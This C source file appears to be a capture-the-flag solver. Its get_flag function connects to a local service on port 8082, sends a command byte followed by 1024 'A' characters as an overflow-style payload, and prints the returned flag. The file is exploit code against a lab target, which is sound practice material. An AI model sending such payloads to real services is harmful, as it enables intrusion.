#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define PORT 8082
#define BUFFER_SIZE 1024

int get_flag() {
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in serv_addr;


	serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)
        <= 0) {
        printf(
            "\nInvalid address/ Address not supported \n");
        return -1;
    }

	connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

	char payload[BUFFER_SIZE];
	for (int i = 0; i < BUFFER_SIZE; i++) {
		payload[i] = 'A';
	}

	send(sock, "\x03", 1, 0);
	send(sock, payload, BUFFER_SIZE, 0);

	char ans[256];
	read(sock, ans, 256);

	printf("%s\n", ans);
	close(sock);
	return 0;
}